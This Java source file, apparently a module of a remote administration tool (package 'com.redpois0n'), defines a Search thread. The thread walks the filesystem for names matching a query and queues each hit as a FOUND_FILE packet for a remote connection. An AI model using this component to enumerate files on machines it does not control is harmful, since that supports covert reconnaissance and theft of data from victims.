package com.redpois0n;

import java.io.File;

import com.redpois0n.packets.in.PacketBuilder;
import com.redpois0n.packets.out.Header;

public class Search extends Thread {

	public static boolean running;

	private String start;
	private String name;
	private boolean dir;

	public Search(String start, String name, boolean dir) {
		this.start = start;
		this.name = name;
		this.dir = dir;
	}

	public void run() {
		running = true;
		try {
			search(start.equals(File.separator) || start.toLowerCase().startsWith("%root%") ? File.listRoots()[0].getAbsolutePath() : start);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public void search(String parentDirectory) throws Exception {
		File[] filesInDirectory = new File(parentDirectory).listFiles();
		for (File f : filesInDirectory) {
			if (!running) {
				return;
			}
			if (f.isDirectory()) {
				search(f.getAbsolutePath());
			}
			if (dir && f.getAbsolutePath().replace(f.getName(), "").toLowerCase().contains(name.toLowerCase()) || f.getName().toLowerCase().contains(name.toLowerCase())) {
				PacketBuilder packet = new PacketBuilder(Header.FOUND_FILE);
				packet.add("FF");
				packet.add(f.getAbsolutePath());
				packet.add(f.getName());
				packet.add(f.isDirectory() + "");
				Connection.addToSendQueue(packet);
			}
		}

	}

}
